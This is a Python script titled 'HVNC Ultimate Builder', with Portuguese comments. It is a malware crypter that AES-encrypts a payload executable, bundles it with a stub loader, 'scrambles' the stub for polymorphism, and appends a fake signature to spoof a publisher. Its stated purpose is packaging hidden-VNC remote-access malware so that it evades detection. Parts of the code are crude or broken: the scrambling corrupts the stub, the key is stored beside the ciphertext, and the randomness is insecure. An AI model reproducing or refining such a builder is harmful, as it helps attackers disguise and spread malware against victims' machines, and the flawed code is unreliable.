import os, shutil, random, string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def rand_bytes(n):
    return bytes(random.getrandbits(8) for _ in range(n))

def gen_keyiv():
    key = rand_bytes(32)   # AES256
    iv  = rand_bytes(16)   # IV
    return key, iv

def crypt_data(raw, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    e = cipher.encryptor()
    # Padding PKCS7
    padlen = 16 - (len(raw) % 16)
    raw += bytes([padlen]*padlen)
    return e.update(raw) + e.finalize()

def change_icon(exe_path, icon_path):
    # Troca ícone via resource hacker (windows, se quiser rodar)
    # Se não, pula essa etapa (Windows only)
    pass

def fake_sign_file(exe_path):
    # Cria assinatura fake no disco (bytes random no PE header, spoof publisher)
    with open(exe_path, "ab") as f:
        f.write(b"FAKESIGN-" + rand_bytes(128))

def scramble_stub(raw):
    # Polimorfismo: embaralha bytes, insere no-op, muda chunk header
    m = bytearray(raw)
    for i in range(0,len(m),64):
        m[i] = (m[i] ^ random.randint(1,255)) & 0xFF
    return bytes(m)

def build(stub_path, payload_path, out_path, icon_path="assets/icon.ico"):
    key, iv = gen_keyiv()
    with open(stub_path, "rb") as sf:
        stub = sf.read()
    with open(payload_path, "rb") as pf:
        payload = pf.read()
    crypted = crypt_data(payload, key, iv)
    structure = b"KEY:" + key + b"IV:" + iv + b"STUB:" + scramble_stub(stub) + b"PAYLOAD:" + crypted
    with open(out_path, "wb") as outf:
        outf.write(structure)
    change_icon(out_path, icon_path)
    fake_sign_file(out_path)
    print(f"[*] Build success: {out_path}\n[*] Key/IV for decrypt: {key.hex()}, {iv.hex()}")

def input_file(prompt, default):
    i = input(f"{prompt} [{default}]: ").strip()
    return i if i else default

if __name__ == "__main__":
    print("[*] HVNC Ultimate Builder")
    stub_path    = input_file("Stub loader exe", "client/stubloader.exe")
    payload_path = input_file("Payload exe", "client/main.exe")
    out_path     = input_file("Output stub bin", "client/stub.bin")
    icon_path    = input_file("Icon (ico)", "assets/icon.ico")
    build(stub_path, payload_path, out_path, icon_path)